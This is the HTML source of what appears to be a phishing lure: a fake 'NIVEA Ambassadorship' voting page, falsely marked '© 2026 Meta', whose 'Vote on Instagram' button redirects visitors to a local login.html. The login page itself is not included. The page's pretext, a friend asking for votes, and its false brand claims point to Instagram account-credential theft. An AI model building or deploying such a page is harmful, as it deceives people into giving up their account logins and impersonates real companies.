<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NIVEA 2026</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @keyframes buttonPop {
      0% {
        opacity: 0;
        transform: scale(0.6) translateY(20px);
      }
      70% {
        transform: scale(1.08) translateY(-5px);
      }
      100% {
        opacity: 1;
        transform: scale(1) translateY(0);
      }
    }

    .vote-button {
      animation: buttonPop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
    }
  </style>
</head>

<body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
  <div class="w-full max-w-md">

    <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
      
      <!-- Header -->
      <div class="relative h-56">
        <img 
          src="IMG_0303.jpeg" 
          alt="Fashion Store"
          class="w-full h-full object-cover"
        />
        <div class="absolute inset-0 bg-black/30"></div>
        <h1 class="absolute bottom-6 left-6 text-white text-3xl md:text-4xl font-bold tracking-wide">
          NIVEA
        </h1>
      </div>

      <!-- Content -->
      <div class="p-6 md:p-8">

        <div class="flex items-center gap-4 mb-6">
          <!-- Badge -->
          <div class="relative flex-shrink-0">
            <svg class="w-16 h-16 text-blue-500" viewBox="0 0 100 100">
              <circle cx="50" cy="50" r="35" fill="currentColor"/>
            </svg>

            <div class="absolute inset-0 flex items-center justify-center">
              <div class="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center">
                <svg class="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"/>
                </svg>
              </div>
            </div>
          </div>

          <div>
            <h2 class="text-2xl md:text-3xl font-bold text-gray-800">NIVEA  AMBASSADORSHIP</h2>
            <p class="text-gray-500 mt-1">118 votes • #3</p>
          </div>
        </div>

        <p class="text-gray-700 leading-relaxed mb-8">
          I need your support! Please take a moment to Join and help me reach new heights in  Launching my Brand on Instagram.
        </p>

        <!-- Vote Button with Animation -->
        <a href="login.html" id="vote-btn"
           class="vote-button block w-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 text-white font-semibold text-lg py-4 rounded-2xl transition-all duration-200 shadow-lg hover:shadow-xl flex items-center justify-center gap-3 cursor-pointer active:scale-95">
          
          <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24">
            <rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" stroke-width="1.5"/>
            <circle cx="12" cy="12" r="3.5" fill="none" stroke="white" stroke-width="1.5"/>
            <circle cx="17" cy="7" r="1.5" fill="white"/>
          </svg>

          Vote on Instagram
        </a>

      </div>
    </div>

    <p class="text-center text-gray-400 text-sm mt-6">
      © 2026 Meta.
    </p>

  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const btn = document.getElementById('vote-btn');

      if (!btn) return;

      btn.addEventListener('click', (e) => {
        // Optional: Add a quick press animation
        btn.style.transform = 'scale(0.92)';
        
        // Redirect almost instantly (10x faster - no delay)
        setTimeout(() => {
          window.location.href = btn.href || "login.html";
        }, 80); // 80ms feels very snappy
      });
    });
  </script>

</body>
</html>
